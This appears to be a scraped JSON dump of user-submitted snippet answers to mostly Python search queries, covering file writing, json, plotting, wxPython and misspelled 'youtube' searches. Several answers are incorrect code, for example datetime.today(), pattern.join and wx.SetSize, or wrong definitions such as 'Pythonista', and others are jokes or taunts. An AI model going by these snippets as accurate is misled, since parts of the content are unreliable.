    "description": "btw im joking, this got quite a few dislikes ^^^^ why do you not know what day it is\nimport datetime  today = datetime.today()  print(today.today)\n",
    "reg_date": "2021-10-12T11:35:36.000Z"
  },
  {
    "id": 4671,
    "keyword": null,
    "link": null,
    "title": " what do i do if my dog eats paper",
    "description": "#call a vet. print('CALL THE VET') import os as fart from turtle import * t.fd(10000000000000)\n",
    "reg_date": "2021-10-12T11:35:37.000Z"
  },
  {
    "id": 4672,
    "keyword": null,
    "link": null,
    "title": " what does float mean in python",
    "description": "V = float(input('enter a number= ')) print(V) #it goes into a decimal  #therefore float is used to changes the number to decimal COPY THIS CODE TO CHEACK\n",
    "reg_date": "2021-10-12T11:35:37.000Z"
  },
  {
    "id": 4673,
    "keyword": null,
    "link": null,
    "title": " what happen when we apply * before list in python",
    "description": "Asterisks for unpacking into function call That print(*fruits) line is passing all of the items in the fruits list into the print  function call as separate arguments, without  us even needing to know how many arguments are in the list. ... Both * and ** can be used multiple times in function calls\n",
    "reg_date": "2021-10-12T11:35:37.000Z"
  },
  {
    "id": 4674,
    "keyword": null,
    "link": null,
    "title": " what is actually better duracell or energizer",
    "description": "print(\"Are you trying to power your computer with this -_-\")\n",
    "reg_date": "2021-10-12T11:35:37.000Z"
  },
  {
    "id": 4675,
    "keyword": null,
    "link": null,
    "title": " what is nea in python",
    "description": "neat is for AI in python 3.\n",
    "reg_date": "2021-10-12T11:35:37.000Z"
  },
  {
    "id": 4676,
    "keyword": null,
    "link": null,
    "title": " what is np.newaxis",
    "description": "a = np.array([[[5,8,7,6,3],              [9,5,7,4,45],              [8,70,45,80,100]],               [[5,8,7,6,3],              [9,5,7,4,45],              [8,70,45,80,100]]]) a.shape >>>(2, 3, 5) # if we want to increase the dimension and want to convert (2,3,5) -> (2,3,5,1) # then we do something like this --  a[:,:,:,np.newaxis].shape >>>(2,3,5,1) # and if we want to increase the dimension and want to convert # (2,3,5) -> (2,3,1,5) then we do something like this -- a[:,:,np.newaxis,:].shape >>>(2,3,1,5) # and if we want to increase the dimension and want to convert # (2,3,5) -> (2,1,3,5) then we do something like this -- a[:,np.newaxis,:,:].shape >>>(2,1,3,5) # and if we want to increase the dimension and want to convert # (2,3,5) -> (1,2,3,5) then we do pretty much as you expect -- a[np.newaxis,:,:,:].shape >>>(1,2,3,5)  # https://i.stack.imgur.com/zkMBy.png  -- see the red color conversion how # this mechanics possible.\n",
    "reg_date": "2021-10-12T11:35:37.000Z"
  },
  {
    "id": 4677,
    "keyword": null,
    "link": null,
    "title": " what is r strip function in python",
    "description": "#!/usr/bin/python  str = \"     this is string example....wow!!!     \"; print str.rstrip() str = \"88888888this is string example....wow!!!8888888\"; print str.rstrip('8')  #the answer  #this is string example....wow!!! #88888888this is string example....wow!!!\n#use the def keyword to declare a function in Python def function(args,kwargs='attribute'):     #here is the returned value     return 'return value'\n",
    "reg_date": "2021-10-12T11:35:37.000Z"
  },
  {
    "id": 4678,
    "keyword": null,
    "link": null,
    "title": " what is stack overflow",
    "description": "Welcome to heaven!!\n// Ah,I see you're a man of culture as well.\nWelcome to Programming Heaven!\nAnswer to all your problems\n// Upvote if you're stuck\nif stackoverflow = \"Wonderland\":   print (\"Stackoverflow is the place to go\")\n",
    "reg_date": "2021-10-12T11:35:37.000Z"
  },
  {
    "id": 4679,
    "keyword": null,
    "link": null,
    "title": " what is the meaning of illiteral with base 10",
    "description": "Literal = It basically occurs when you pass a string that is not an Integer through the int() function (I mean like try to pass ok ok)\n",
    "reg_date": "2021-10-12T11:35:37.000Z"
  },
  {
    "id": 4680,
    "keyword": null,
    "link": null,
    "title": " what is the purpose of the judiciary",
    "description": "The judiciary is the branch of government which administers justice according to law. The term is used to refer broadly to the courts, the judges,  magistrates, adjudicators and other support personnel who run the system.  The courts apply the law, and settle disputes and punish law-breakers according to the law\n",
    "reg_date": "2021-10-12T11:35:37.000Z"
  },
  {
    "id": 4681,
    "keyword": null,
    "link": null,
    "title": " what is the tracing output of the code below x=10 y=50 if(x**2> 100 and y <100): print(x,y)",
    "description": "x = 10 y = 50 if (x ** 2 > 100 and y < 100):     print(x, y)\n",
    "reg_date": "2021-10-12T11:35:38.000Z"
  },
  {
    "id": 4682,
    "keyword": null,
    "link": null,
    "title": " what is ycor in python turle",
    "description": "import turtle #import example=turtle.Turtle() example_y = example.ycor #ycor returns the y position of your turtle object\n",
    "reg_date": "2021-10-12T11:35:38.000Z"
  },
  {
    "id": 4683,
    "keyword": null,
    "link": null,
    "title": " what skills do you need to master pvp in minecraft",
    "description": "print('be a simp')\n",
    "reg_date": "2021-10-12T11:35:38.000Z"
  },
  {
    "id": 4684,
    "keyword": null,
    "link": null,
    "title": " what to do in python when you get pygame.Surface object is not callable",
    "description": "screen.blit(playerImg, (x, y)) you need to remeber the commas\n",
    "reg_date": "2021-10-12T11:35:38.000Z"
  },
  {
    "id": 4685,
    "keyword": null,
    "link": null,
    "title": " when opening a file in python what does w mean",
    "description": "#w opens on the write function. When you put a line of code like:   user_file = open('file_name', w) #it opens a file name to write with.\n",
    "reg_date": "2021-10-12T11:35:38.000Z"
  },
  {
    "id": 4686,
    "keyword": null,
    "link": null,
    "title": " which folder python os",
    "description": "import os cwd = os.getcwd()\n",
    "reg_date": "2021-10-12T11:35:38.000Z"
  },
  {
    "id": 4687,
    "keyword": null,
    "link": null,
    "title": " which is better julia or python",
    "description": "I love julia, its 10 times better than python.You all must be thinking that  python has more libraries than julia.the intresting part of julia is you can import python libraries in julia for eg-numpy, pandas, open-cv etc.The perfomance-speed after importing python libraries is just awesome.\n\"\"\" Yes, Julia is a Superior Language to Python. It will take some time for the Julia community to rival Python's community. Surely it will happen, in time. What a great oppurtunity for us to build a new and Exciting language. Faster, Sleeker, Simpler,  composable multi-threaded parallelism! Julia really is Incredible and the Future of Data Engineering. The Reason that I love Julia is that the Language is written......In Julia!+ Compare Python, and it is Written in C.. Forgeddaboudit! This allows a Julia user to become much more intimate with the Framework. Julia also plays nice with Python, with the use of PYCall. It really is an Incredible language, and I don't think that your time  Will be wasted by learning Julia. \"\"\"\n",
    "reg_date": "2021-10-12T11:35:38.000Z"
  },
  {
    "id": 4688,
    "keyword": null,
    "link": null,
    "title": " who is a pythonista",
    "description": "Pythonista to refer to someone who is a beginner in programming.\n",
    "reg_date": "2021-10-12T11:35:38.000Z"
  },
  {
    "id": 4689,
    "keyword": null,
    "link": null,
    "title": " who is rishi smaran = \"RISHI SMARAN IS A 12 YEAR OLD NAUGHTY KID WHO CREATED ME\"",
    "description": "who is rishi smaran = \"RISHI SMARAN IS A 12 YEAR OLD NAUGHTY KID WHO HAS CREATED ME\"\n",
    "reg_date": "2021-10-12T11:35:38.000Z"
  },
  {
    "id": 4690,
    "keyword": null,
    "link": null,
    "title": " who wrote permission to dance",
    "description": "ed sheeran, jenna andrews ,steve mac, jhonny mcdaid \n",
    "reg_date": "2021-10-12T11:35:38.000Z"
  },
  {
    "id": 4691,
    "keyword": null,
    "link": null,
    "title": " why is python slow",
    "description": "Because python is an interpreted language\n",
    "reg_date": "2021-10-12T11:35:39.000Z"
  },
  {
    "id": 4692,
    "keyword": null,
    "link": null,
    "title": " why is there a lot of numbers in python",
    "description": ">>> 0.1 0.1000000000000000055511151231257827021181583404541015625 \n",
    "reg_date": "2021-10-12T11:35:39.000Z"
  },
  {
    "id": 4693,
    "keyword": null,
    "link": null,
    "title": " why when I merge my label cluster with my dataframe i get more row",
    "description": "Your indices are probably not unique. You could try pd.merge(Historie, Kmeans, on='SKU_NR', how='left') \n",
    "reg_date": "2021-10-12T11:35:39.000Z"
  },
  {
    "id": 4694,
    "keyword": null,
    "link": null,
    "title": " width and height of pil image",
    "description": "image = PIL.Image.open(\"sample.png\") width, height = image.size\n",
    "reg_date": "2021-10-12T11:35:39.000Z"
  },
  {
    "id": 4695,
    "keyword": null,
    "link": null,
    "title": " wikipedia python api",
    "description": "import wikipedia print wikipedia.summary(\"Wikipedia\") # Wikipedia (/ˌwɪkɨˈpiːdiə/ or /ˌwɪkiˈpiːdiə/ WIK-i-PEE-dee-ə) is a collaboratively edited, multilingual, free Internet encyclopedia supported by the non-profit Wikimedia Foundation...  wikipedia.search(\"Barack\") # [u'Barak (given name)', u'Barack Obama', u'Barack (brandy)', u'Presidency of Barack Obama', u'Family of Barack Obama', u'First inauguration of Barack Obama', u'Barack Obama presidential campaign, 2008', u'Barack Obama, Sr.', u'Barack Obama citizenship conspiracy theories', u'Presidential transition of Barack Obama']  ny = wikipedia.page(\"New York\") ny.title # u'New York' ny.url # u'http://en.wikipedia.org/wiki/New_York' ny.content # u'New York is a state in the Northeastern region of the United States. New York is the 27th-most exten'... ny.links[0] # u'1790 United States Census'  wikipedia.set_lang(\"fr\") wikipedia.summary(\"Facebook\", sentences=1) # Facebook est un service de r&eacute;seautage social en ligne sur Internet permettant d'y publier des informations (photographies, liens, textes, etc.) en contr&ocirc;lant leur visibilit&eacute; par diff&eacute;rentes cat&eacute;gories de personnes. \n#pip install wikipedia import wikipedia question = input(\"What is your question? \") print(wikipedia.summary(question)) \npip install wikipedia\nprint(wikipedia.page(\"Python\").content) \n",
    "reg_date": "2021-10-12T11:35:39.000Z"
  },
  {
    "id": 4696,
    "keyword": null,
    "link": null,
    "title": " window size cv2",
    "description": "import cv2 cv2.namedWindow(\"output\", cv2.WINDOW_AUTOSIZE)        # Create window with freedom of dimensions im = cv2.imread(\"earth.jpg\")                        # Read image imS = cv2.resize(im, (960, 540))                    # Resize image cv2.imshow(\"output\", imS)                            # Show image cv2.waitKey(0)                                      # Display the image infinitely until any keypress\n",
    "reg_date": "2021-10-12T11:35:39.000Z"
  },
  {
    "id": 4697,
    "keyword": null,
    "link": null,
    "title": " windows alert python",
    "description": "import win32api win32api.MessageBox(0, 'hello', 'title')\n",
    "reg_date": "2021-10-12T11:35:39.000Z"
  },
  {
    "id": 4698,
    "keyword": null,
    "link": null,
    "title": " windows python pip upgrade",
    "description": "python -m pip install --upgrade pip \npython -m pip install --upgrade pip\nsudo pip3 install --upgrade pip\n",
    "reg_date": "2021-10-12T11:35:39.000Z"
  },
  {
    "id": 4699,
    "keyword": null,
    "link": null,
    "title": " with font type stuff python turtle",
    "description": "import turtle  pen = turtle.Turtle()  pen.write(\"Python is cool\", font=(\"Calibri\", 8, \"bold\"))\n",
    "reg_date": "2021-10-12T11:35:40.000Z"
  },
  {
    "id": 4700,
    "keyword": null,
    "link": null,
    "title": " with python how to check alomost similar words",
    "description": "Str1 = \"The supreme court case of Nixon vs The United States\" Str2 = \"Nixon v. United States\" Ratio = fuzz.ratio(Str1.lower(),Str2.lower()) Partial_Ratio = fuzz.partial_ratio(Str1.lower(),Str2.lower()) Token_Sort_Ratio = fuzz.token_sort_ratio(Str1,Str2) Token_Set_Ratio = fuzz.token_set_ratio(Str1,Str2) print(Ratio) print(Partial_Ratio) print(Token_Sort_Ratio) print(Token_Set_Ratio)\ndifflib.get_close_matches(word, ['words'])  \n",
    "reg_date": "2021-10-12T11:35:40.000Z"
  },
  {
    "id": 4701,
    "keyword": null,
    "link": null,
    "title": " with the following function we can select highly correlated features",
    "description": "# with the following function we can select highly correlated features # it will remove the first feature that is correlated with anything other feature  def correlation(dataset, threshold):     col_corr = set()  # Set of all the names of correlated columns     corr_matrix = dataset.corr()     for i in range(len(corr_matrix.columns)):         for j in range(i):             if abs(corr_matrix.iloc[i, j]) > threshold: # we are interested in absolute coeff value                 colname = corr_matrix.columns[i]  # getting the name of column                 col_corr.add(colname)     return col_corr    corr_features = correlation(X_train, 0.7) len(set(corr_features))\n",
    "reg_date": "2021-10-12T11:35:40.000Z"
  },
  {
    "id": 4702,
    "keyword": null,
    "link": null,
    "title": " wonsan",
    "description": "print Grepper is awesome\n",
    "reg_date": "2021-10-12T11:35:40.000Z"
  },
  {
    "id": 4703,
    "keyword": null,
    "link": null,
    "title": " word pattern python",
    "description": "import string  def word_to_pattern(word):     # Stores actual-letter to pattern-placeholder mapping     mapping = {}      # ZYXW... so we cap pop letters starting with A from the end     available_pattern_letters = list(string.ascii_uppercase)[::-1]      pattern = []     for letter in word.upper():         if letter not in string.ascii_uppercase:             # for punctuation etc             pattern.append(letter)             continue         if letter not in mapping:             # new letter we haven't seen yet in this word             mapping[letter] = available_pattern_letters.pop()         pattern.append(mapping[letter])     return pattern.join(\"\") \n",
    "reg_date": "2021-10-12T11:35:40.000Z"
  },
  {
    "id": 4704,
    "keyword": null,
    "link": null,
    "title": " working directory python",
    "description": "import os  path = os.getcwd()  print(path) # /Users/mbp/Documents/my-project/python-snippets/notebook  print(type(path)) # <class 'str'> \nimport os cwd = os.getcwd()\nimport os  dir_path = os.path.dirname(os.path.realpath(__file__))\nimport os os.getcwd() \n# print current working directory in python import os cwd = os.getcwd() print(cwd)\nimport os cwd = os.getcwd()  my_file='image.png' file_path = os.path.join(cwd, my_file) file_path\n",
    "reg_date": "2021-10-12T11:35:40.000Z"
  },
  {
    "id": 4705,
    "keyword": null,
    "link": null,
    "title": " wrap list python",
    "description": "ls[index % len(ls)]\n",
    "reg_date": "2021-10-12T11:35:40.000Z"
  },
  {
    "id": 4706,
    "keyword": null,
    "link": null,
    "title": " write custom query odoo",
    "description": " self.env.cr.execute(\"your query goes here \") values = self.env.cr.dictfetchall() // here you will get the values  for index in range(0, len(values)):                 print(f\"\\n\\n {values[index].get('key_name')}  \\n\\n\")\n",
    "reg_date": "2021-10-12T11:35:40.000Z"
  },
  {
    "id": 4707,
    "keyword": null,
    "link": null,
    "title": " write geopands into postgres python",
    "description": "from sqlalchemy import create_engine db_connection_url = \"postgres://myusername:mypassword@myhost:5432/mydatabase\"; engine = create_engine(db_connection_url) countries_gdf.to_postgis(name=\"countries_table\", con=engine) \n",
    "reg_date": "2021-10-12T11:35:40.000Z"
  },
  {
    "id": 4708,
    "keyword": null,
    "link": null,
    "title": " write json pythonb",
    "description": "import json  data = {} data['people'] = [] data['people'].append({     'name': 'Scott',     'website': 'stackabuse.com',     'from': 'Nebraska' }) data['people'].append({     'name': 'Larry',     'website': 'google.com',     'from': 'Michigan' }) data['people'].append({     'name': 'Tim',     'website': 'apple.com',     'from': 'Alabama' })  with open('data.txt', 'w') as outfile:     json.dump(data, outfile) \nimport json  with open('data.txt') as json_file:     data = json.load(json_file)     for p in data['people']:         print('Name: ' + p['name'])         print('Website: ' + p['website'])         print('From: ' + p['from'])         print('') \n>>> import json >>> data = {'item': 'Beer', 'cost':'&pound;4.00'} >>> jstr = json.dumps(data, indent=4) >>> print(jstr) {     \"item\": \"Beer\",     \"cost\": \"\\u00a34.00\" } \n>>> jstr = json.dumps(data, ensure_ascii=False, indent=4) >>> print(jstr) {     \"item\": \"Beer\",     \"cost\": \"&pound;4.00\" } \n>>> import json >>> data = {'people':[{'name': 'Scott', 'website': 'stackabuse.com', 'from': 'Nebraska'}]} >>> json.dumps(data, indent=4) {     \"people\": [         {             \"website\": \"stackabuse.com\",              \"from\": \"Nebraska\",              \"name\": \"Scott\"         }     ] } \n",
    "reg_date": "2021-10-12T11:35:41.000Z"
  },
  {
    "id": 4709,
    "keyword": null,
    "link": null,
    "title": " write json to file python",
    "description": "import json  with open('path_to_file/person.json') as f:   data = json.load(f)  print(data)\nwith open('output.json', 'w') as outfile:     json.dump(data, outfile)\nimport json  data = {\"key\": \"value\"}  with open('data.json', 'w') as jsonfile:     json.dump(data, jsonfile) \nimport json  data = {} data['people'] = [] data['people'].append({     'name': 'Scott',     'website': 'stackabuse.com',     'from': 'Nebraska' }) data['people'].append({     'name': 'Larry',     'website': 'google.com',     'from': 'Michigan' }) data['people'].append({     'name': 'Tim',     'website': 'apple.com',     'from': 'Alabama' })  with open('data.txt', 'w') as outfile:     json.dump(data, outfile) \nimport json  with open('data.txt') as json_file:     data = json.load(json_file)     for p in data['people']:         print('Name: ' + p['name'])         print('Website: ' + p['website'])         print('From: ' + p['from'])         print('') \n# to write on file # data_dict is a dictionary  import json          with open('data.json', 'w') as f: \tjson.dump(data_dict, f)\n",
    "reg_date": "2021-10-12T11:35:41.000Z"
  },
  {
    "id": 4710,
    "keyword": null,
    "link": null,
    "title": " write multiple df to excel pandas",
    "description": "# Create a Pandas Excel writer using XlsxWriter as the engine. with pd.ExcelWriter('pandas_multiple.xlsx', engine='xlsxwriter') as writer:         # Write each dataframe to a different worksheet.     final_df.to_excel(writer, sheet_name='Sheet1')     df_unigrams.to_excel(writer, sheet_name='Sheet2')     df_bigrams.to_excel(writer, sheet_name='Sheet3') \n",
    "reg_date": "2021-10-12T11:35:41.000Z"
  },
  {
    "id": 4711,
    "keyword": null,
    "link": null,
    "title": " write number of lines in file python",
    "description": "f = open(\"filename\", \"r\") #Load file in any mode that's able to read, ie r, r+, w+ etc  #to get length len(f.readlines())  #To iterate over each line for line in f.readlines(): #file.readlines(), splits the file into a list, where each element is a seperate line   print(line)\nfname = \"test.txt\" count = 0 with open(fname, 'r') as f:     for line in f:         count += 1 print(\"Total number of lines is:\", count) \n",
    "reg_date": "2021-10-12T11:35:41.000Z"
  },
  {
    "id": 4712,
    "keyword": null,
    "link": null,
    "title": " write specific columns to csv pandas",
    "description": "df[['col1', 'col3']].to_csv('some_file.csv') \n",
    "reg_date": "2021-10-12T11:35:41.000Z"
  },
  {
    "id": 4713,
    "keyword": null,
    "link": null,
    "title": " write string to file python",
    "description": "price = 33.3 with open(\"Output.txt\", \"w\") as text_file:     text_file.write(\"Purchase Amount: %s price %f\" % (TotalAmount, price)) \nprice = 33.3 with open(\"Output.txt\", \"w\") as text_file:     text_file.write(\"Purchase Amount: %s price %f\" % (TotalAmount, price))\n>>> with open('workfile') as f: ...     read_data = f.read()  >>> # We can check that the file has been automatically closed. >>> f.closed True \n",
    "reg_date": "2021-10-12T11:35:41.000Z"
  },
  {
    "id": 4714,
    "keyword": null,
    "link": null,
    "title": " write to file python 3",
    "description": "with open(filename, 'a') as out:     out.write(var + '\\n') \nwith open(filename, 'a') as f:     print(var, file=f) \n>>> with open('workfile') as f: ...     read_data = f.read()  >>> # We can check that the file has been automatically closed. >>> f.closed True \n",
    "reg_date": "2021-10-12T11:35:41.000Z"
  },
  {
    "id": 4715,
    "keyword": null,
    "link": null,
    "title": " wxpython change window size",
    "description": "wx.SetSize(frm, width, height)\n",
    "reg_date": "2021-10-12T11:35:41.000Z"
  },
  {
    "id": 4716,
    "keyword": null,
    "link": null,
    "title": " wxpython custom dialog",
    "description": "#!/usr/bin/env python  ''' ZetCode wxPython tutorial  In this code example, we create a custom dialog.  author: Jan Bodnar website: www.zetcode.com last modified: July 2020 '''  import wx  class ChangeDepthDialog(wx.Dialog):      def __init__(self, *args, **kw):         super(ChangeDepthDialog, self).__init__(*args, **kw)          self.InitUI()         self.SetSize((250, 200))         self.SetTitle(\"Change Color Depth\")       def InitUI(self):          pnl = wx.Panel(self)         vbox = wx.BoxSizer(wx.VERTICAL)          sb = wx.StaticBox(pnl, label='Colors')         sbs = wx.StaticBoxSizer(sb, orient=wx.VERTICAL)         sbs.Add(wx.RadioButton(pnl, label='256 Colors',             style=wx.RB_GROUP))         sbs.Add(wx.RadioButton(pnl, label='16 Colors'))         sbs.Add(wx.RadioButton(pnl, label='2 Colors'))          hbox1 = wx.BoxSizer(wx.HORIZONTAL)         hbox1.Add(wx.RadioButton(pnl, label='Custom'))         hbox1.Add(wx.TextCtrl(pnl), flag=wx.LEFT, border=5)         sbs.Add(hbox1)          pnl.SetSizer(sbs)          hbox2 = wx.BoxSizer(wx.HORIZONTAL)         okButton = wx.Button(self, label='Ok')         closeButton = wx.Button(self, label='Close')         hbox2.Add(okButton)         hbox2.Add(closeButton, flag=wx.LEFT, border=5)          vbox.Add(pnl, proportion=1,             flag=wx.ALL|wx.EXPAND, border=5)         vbox.Add(hbox2, flag=wx.ALIGN_CENTER|wx.TOP|wx.BOTTOM, border=10)          self.SetSizer(vbox)          okButton.Bind(wx.EVT_BUTTON, self.OnClose)         closeButton.Bind(wx.EVT_BUTTON, self.OnClose)       def OnClose(self, e):          self.Destroy()   class Example(wx.Frame):      def __init__(self, *args, **kw):         super(Example, self).__init__(*args, **kw)          self.InitUI()       def InitUI(self):          tb = self.CreateToolBar()         tb.AddTool(toolId=wx.ID_ANY, label='', bitmap=wx.Bitmap('color.png'))          tb.Realize()          tb.Bind(wx.EVT_TOOL, self.OnChangeDepth)          self.SetSize((350, 250))         self.SetTitle('Custom dialog')         self.Centre()      def OnChangeDepth(self, e):          cdDialog = ChangeDepthDialog(None,             title='Change Color Depth')         cdDialog.ShowModal()         cdDialog.Destroy()   def main():      app = wx.App()     ex = Example(None)     ex.Show()     app.MainLoop()   if __name__ == '__main__':     main() \n",
    "reg_date": "2021-10-12T11:35:41.000Z"
  },
  {
    "id": 4717,
    "keyword": null,
    "link": null,
    "title": " wxpython make window stay on top",
    "description": "frm.SetWindowStyle(wx.STAY_ON_TOP)\n",
    "reg_date": "2021-10-12T11:35:41.000Z"
  },
  {
    "id": 4718,
    "keyword": null,
    "link": null,
    "title": " x= [10] def List ex(): x.append(20) def add list(): x=[30,40] x.append(50) print (x) List ex() print (x) add list() print (x)",
    "description": "x= [10] def List_ex():     x.append(20) def add_list():     x=[30,40]     x.append(50) print (x) List_ex() print (x) add_list() print (x)  \n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4719,
    "keyword": null,
    "link": null,
    "title": " x=x+1",
    "description": "#All mathmations' worst nighmare, but a programmers best friend.\n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4720,
    "keyword": null,
    "link": null,
    "title": " xarray add coordinate",
    "description": ">>> da = xr.DataArray( ...     np.random.rand(4), ...     coords=[np.array([358, 359, 0, 1])], ...     dims=\"lon\", ... ) >>> da <xarray.DataArray (lon: 4)> array([0.5488135 , 0.71518937, 0.60276338, 0.54488318]) Coordinates:   * lon      (lon) int64 358 359 0 1    >>> da.assign_coords(lon=(((da.lon + 180) % 360) - 180)) <xarray.DataArray (lon: 4)> array([0.5488135 , 0.71518937, 0.60276338, 0.54488318]) Coordinates:   * lon      (lon) int64 -2 -1 0 1 \n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4721,
    "keyword": null,
    "link": null,
    "title": " xaxis matplotlib",
    "description": "import matplotlib.pyplot as plt x = [0.00001,0.001,0.01,0.1,0.5,1,5] # create an index for each tick position xi = list(range(len(x))) y = [0.945,0.885,0.893,0.9,0.996,1.25,1.19] plt.ylim(0.8,1.4) # plot the index for the x-values plt.plot(xi, y, marker='o', linestyle='--', color='r', label='Square')  plt.xlabel('x') plt.ylabel('y')  plt.xticks(xi, x) plt.title('compare') plt.legend()  plt.show()\n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4722,
    "keyword": null,
    "link": null,
    "title": " xlabel seaborn",
    "description": "import pandas as pd import seaborn as sns import matplotlib.pyplot as plt  fake = pd.DataFrame({'cat': ['red', 'green', 'blue'], 'val': [1, 2, 3]}) ax = sns.barplot(x = 'val', y = 'cat',                data = fake,                color = 'black') ax.set(xlabel='common xlabel', ylabel='common ylabel') plt.show()\n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4723,
    "keyword": null,
    "link": null,
    "title": " xlim python",
    "description": "plt.xlim([a,b])\nax=plt.subplot(111) ylims=ax.get_ylim() xlims=ax.get_xlim()\n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4724,
    "keyword": null,
    "link": null,
    "title": " xpath helium",
    "description": "element=find_all(S(\"//tagname[@attribute='value']\"))\n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4725,
    "keyword": null,
    "link": null,
    "title": " yapf ignore line",
    "description": "# yapf: disable\n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4726,
    "keyword": null,
    "link": null,
    "title": " yesno django",
    "description": "{{ value|yesno:\"yeah,no,maybe\" }}\n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4727,
    "keyword": null,
    "link": null,
    "title": " ylim python",
    "description": "plt.ylim([a,b])\n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4728,
    "keyword": null,
    "link": null,
    "title": " yopu",
    "description": "\"\"\"What a noob who can't even type youtube.com correctly\"\"\" #YOU ARE USELESS\n",
    "reg_date": "2021-10-12T11:35:42.000Z"
  },
  {
    "id": 4729,
    "keyword": null,
    "link": null,
    "title": " yotuube",
    "description": "\"\"\"What a noob who can't even type youtube.com correctly\"\"\" #YOU ARE USELESS\nthink twice, You can be trapped for couple of hours instead of coding\nYou're supposed to be doing something arn't you...\nStop it! Go back to work!\nsource of happiness\nuse the firt link\n",
    "reg_date": "2021-10-12T11:35:43.000Z"
  },
  {
    "id": 4730,
    "keyword": null,
    "link": null,
    "title": " you-tube",
    "description": "\"\"\"What a noob who can't even type youtube.com correctly\"\"\" #YOU ARE USELESS\nthink twice, You can be trapped for couple of hours instead of coding\nYou're supposed to be doing something arn't you...\ngo back to coding\nONLY use for programming help. Do not get distracted!\nTo all these people, I'm looking up youtube for something productive, I promise!!!\n// I hope you're about to search solutions for your code and not watch PewDiePie\nd i s t r a c t i o n s\n #dont waste time get back to codin\ndont procrastinate mf, code some more\n",
    "reg_date": "2021-10-12T11:35:43.000Z"
  },
  {
    "id": 4731,
    "keyword": null,
    "link": null,
    "title": " you",
    "description": "\"\"\"What a noob who can't even type youtube.com correctly\"\"\" #YOU ARE USELESS\nthink twice, You can be trapped for couple of hours instead of coding\nYou're supposed to be doing something arn't you...\n\"dont watch youtube ..back to coding\"\n\"\"\"Almost there, 3 letters remain !\"\"\" \nEither you're searching this for a short way to get to youtube, or you're actually looking for the show \"you\"\n",
    "reg_date": "2021-10-12T11:35:43.000Z"
  },
  {
    "id": 4732,
    "keyword": null,
    "link": null,
    "title": " youtube.oc",
    "description": "\"\"\"What a noob who can't even type youtube.com correctly\"\"\" #YOU ARE USELESS\n",
    "reg_date": "2021-10-12T11:35:43.000Z"
  },
  {
    "id": 4733,
    "keyword": null,
    "link": null,
    "title": " yoyu",
    "description": "\"\"\"What a noob who can't even type youtube.com correctly\"\"\" #YOU ARE USELESS\nYou're supposed to be doing something arn't you...\n//why are you procrastinating? go back to coding \nWhy are you going to youtube? Get back to programming!\nyoutube.com \n",
    "reg_date": "2021-10-12T11:35:43.000Z"
  },
  {
    "id": 4734,
    "keyword": null,
    "link": null,
    "title": " ytouube",
    "description": "\"\"\"What a noob who can't even type youtube.com correctly\"\"\" #YOU ARE USELESS\nthink twice, You can be trapped for couple of hours instead of coding\nYou're supposed to be doing something arn't you...\ngo back to coding\nTo all these people, I'm looking up youtube for something productive, I promise!!!\n// I hope you're about to search solutions for your code and not watch PewDiePie\n",
    "reg_date": "2021-10-12T11:35:43.000Z"
  },
  {
    "id": 4735,
    "keyword": null,
    "link": null,
    "title": " yu",
    "description": "\"\"\"What a noob who can't even type youtube.com correctly\"\"\" #YOU ARE USELESS\nthink twice, You can be trapped for couple of hours instead of coding\ndid you try searching youtube or..?\n",
    "reg_date": "2021-10-12T11:35:43.000Z"
  },
  {
    "id": 4736,
    "keyword": null,
    "link": null,
    "title": " yyyy-mm-dd hh:mm:ss.0 python",
    "description": "now = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S.%f\") \n",
    "reg_date": "2021-10-12T11:35:43.000Z"
  },
  {
    "id": 4737,
    "keyword": null,
    "link": null,
    "title": " zen of python",
    "description": "# To read The Zen of Python, type in:  import this  # But I just can't resist putting The Zen of Python in here anyway.    \"\"\"  The Zen of Python, by Tim Peters  Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than *right* now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those!  \"\"\"   \"\"\" If you are wondering what this is about, the Zen of Python is basically a set of rules Python  programmers should try to follow. But, keep in mind that this is **TOTALLY OPTIONAL**. \"\"\"\nBeautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than *right* now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those! \n",
    "reg_date": "2021-10-12T11:35:43.000Z"
  },
  {
    "id": 4738,
    "keyword": null,
    "link": null,
    "title": " zerodivisionerror python",
